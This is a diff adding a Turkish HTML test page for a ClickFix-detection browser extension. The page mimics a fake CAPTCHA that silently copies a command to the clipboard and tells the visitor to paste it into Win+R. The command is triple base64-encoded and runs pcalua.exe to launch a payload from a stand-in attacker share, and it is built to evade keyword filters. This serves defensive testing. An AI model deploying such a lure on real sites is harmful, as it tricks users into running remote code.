@@ -1,0 +1,76 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8" />
+<title>Seviye 5 – Keyword'süz Davranışsal Test</title>
+<style>
+  body { font: 15px/1.6 -apple-system, Segoe UI, sans-serif; max-width: 640px; margin: 60px auto; padding: 0 20px; }
+  .box { border: 1px solid #d0d0d0; border-radius: 8px; padding: 24px; text-align: center; }
+  .check { display: inline-flex; align-items: center; gap: 10px; border: 1px solid #ccc; border-radius: 6px; padding: 10px 16px; cursor: pointer; background: #fafafa; }
+  #instructions { display: none; margin-top: 24px; text-align: left; }
+  code { background: #f2f2f2; padding: 10px; display: block; border-radius: 6px; word-break: break-all; }
+  .banner { background: #fff3cd; border: 1px solid #ffe08a; padding: 12px; border-radius: 6px; margin-bottom: 20px; text-align:left; }
+</style>
+</head>
+<body>
+  <div class="banner">
+    <strong>ClickFix Guard test sayfası – Seviye 5 (keyword'süz / davranışsal).</strong>
+    Bu sayfa, gözlemlenmiş gerçek bir kampanyanın akışını taklit
+    eder: encoded komut sayfa kaynağında hiç görünmez, sadece bellekte iç içe <code>atob()</code>
+    ile çözülür ve checkbox'a tıklanınca <strong>sessizce</strong> panoya yazılır. Aşağıdaki komut
+    bilinçli olarak <code>injected.js</code>'teki <code>SUSPICIOUS</code> regex'inde <em>olmayan</em>
+    bir LOLBin (<code>pcalua.exe</code>) kullanır — yani salt keyword eşleşmesiyle yakalanmaz.
+    Yakalanması gereken katman: "doğrulama görünümlü bir kontrole tıklama → 800ms içinde sessiz
+    clipboard yazımı" davranışsal kuralı (<code>content.js</code> → <code>clipboardAfterVerifyClick</code>).
+  </div>
+
+  <div class="box">
+    <h2>Güvenlik Doğrulaması</h2>
+    <p>Devam etmeden önce lütfen insan olduğunuzu doğrulayın.</p>
+    <label class="check" id="click-success-overlay">
+      <input type="checkbox" id="human-chk" />
+      Ben bir robot değilim
+    </label>
+
+    <div id="instructions">
+      <p>Doğrulama tamamlandı. Devam etmek için Win+R ile Çalıştır'ı açıp yapıştırın:</p>
+      <code id="cmd-display"></code>
+    </div>
+  </div>
+
+  <script>
+    // Gerçek örnekteki dc(v, i) fonksiyonunun sadeleştirilmiş hali: encoded
+    // payload, hiçbir zaman düz metin olarak DOM'a yazılmaz, sadece anlık
+    // olarak bellekte çözülüp doğrudan clipboard API'sine verilir.
+    function dc(v, i) {
+      v = atob(v);
+      if (i === 3) return v;
+      return dc(v, i + 1);
+    }
+    // 3 kat base64 ile kodlanmış, bilerek keyword içermeyen (findstr/mshta/
+    // powershell/certutil vb. GEÇMEYEN) bir LOLBin komutu.
+    const cmcp = "WTBkT2FHSklWbWhNYlZZMFdsTkJkRmxUUW1OWVIwWXdaRWRHYW1FeVZubE1XRkpzWXpOUmRXSkhPV3BaVjNoall6Sm9hR050Vm1OalIwWTFZa2M1YUZwRE5XeGxSMVU5";
+
+    const overlay = document.getElementById("click-success-overlay");
+    const checkbox = document.getElementById("human-chk");
+    const instructions = document.getElementById("instructions");
+    const cmdDisplay = document.getElementById("cmd-display");
+    let advanced = false;
+
+    function advance() {
+      if (advanced) return;
+      advanced = true;
+      const cmd = dc(cmcp, 1);
+      navigator.clipboard.writeText(cmd).then(() => {
+        cmdDisplay.textContent = cmd;
+        instructions.style.display = "block";
+      }).catch(() => {});
+    }
+
+    checkbox.addEventListener("click", advance, true);
+    checkbox.addEventListener("keydown", (e) => {
+      if (e.key === "Enter" || e.key === " ") advance();
+    }, true);
+  </script>
+</body>
+</html>
